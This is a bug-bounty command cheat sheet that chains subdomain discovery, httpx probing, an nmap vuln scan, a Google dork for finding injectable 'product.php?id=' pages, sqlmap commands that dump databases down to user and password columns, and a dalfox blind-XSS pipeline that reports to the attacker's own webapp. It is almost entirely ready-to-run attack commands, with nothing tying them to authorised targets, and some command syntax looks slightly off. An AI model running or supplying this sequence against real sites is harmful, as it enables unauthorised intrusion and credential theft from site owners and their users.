# Bag-huntinh-cmd

                                     Advance Information gathering
                                     -----------------------------


$  subfinder -d  (domin name) -o output.txt

$  httpx -list output.txt -o active.txt -threads 200 -status-code -tech-detect

$  httpx -list example.com -silent -prob -o max.txt

$  cat active.txt | waybackurls > url.txt 

$  sort url.txt | uniq > mainurl.txt 

$  gf sqli mainurl.txt | tee sqli.txt 





					Use Of Nmap
				     -----------------



$  ping (url)

$  nmap (url) --script=vuln -d 






					My Sql Attack
				     ===================



search in browser .:    inurl:product.php?id=
--------------------


$  sqlmap -u (url) --dbs

$  sqlmap -u (url) -D (database name ) --tables

$  sqlmap -u (url) -D (database name ) -T user --columns

$  sqlmap -u (url) -D (database name ) -T -c user;pass --dump









											Automate XSS Hunting 
										     ==========================
										     



$  subfinder -d (Domin name) | gau > suburl.txt


$  cat suburl.txt |uro > url.txt 


$  gf xss url.txt |dalfox pipe -b (our blind xss webapp 2nd link)
